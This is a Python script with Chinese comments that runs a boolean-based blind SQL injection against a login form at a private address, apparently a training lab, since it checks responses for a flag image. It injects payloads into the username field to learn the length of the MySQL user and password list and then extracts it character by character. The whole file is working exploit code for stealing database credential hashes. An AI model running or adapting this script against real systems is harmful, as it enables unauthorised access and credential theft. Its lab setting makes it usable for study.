import requests

# 网站路径
url = "http://10.51.0.8"
# 判断长度的payload
payload_len = """1') or length(
                    (select group_concat(user,password) 
                     from mysql.user)
                )>{n} -- a"""
# 枚举字符的payload
payload_str = """a') or ascii(
                    substr(
                        (select group_concat(user,password)
                        from mysql.user)
                    ,{l},1)
                )={n} -- a"""

# post请求参数
data= {
    "uname" : "a') or 1 -- a",
    "passwd" : "1",
    "submit" : "Submit"
}

# 判断长度
def getLen(payload_len):
    length = 1
    while True:
        # 修改请求参数
        data["uname"] = payload_len.format(n = length)
        response = requests.post(url=url, data=data)
        # 出现此内容为登录成功
        if '../images/flag.jpg' in response.text:
            print('正在测试长度：', length)
            length += 1
        else:
            print('测试成功，长度为：', length)
            return length;

# 枚举字符
def getStr(length):
    str = ''
    # 从第一个字符开始截取
    for l in range(1, length+1):
        # 枚举字符的每一种可能性
        for n in range(32, 126):
            data["uname"] = payload_str.format(l=l, n=n)
            response = requests.post(url=url, data=data)
            if '../images/flag.jpg' in response.text:
                str += chr(n)
                print('第', l, '个字符枚举成功：',str )
                break

length = getLen(payload_len)
getStr(length)
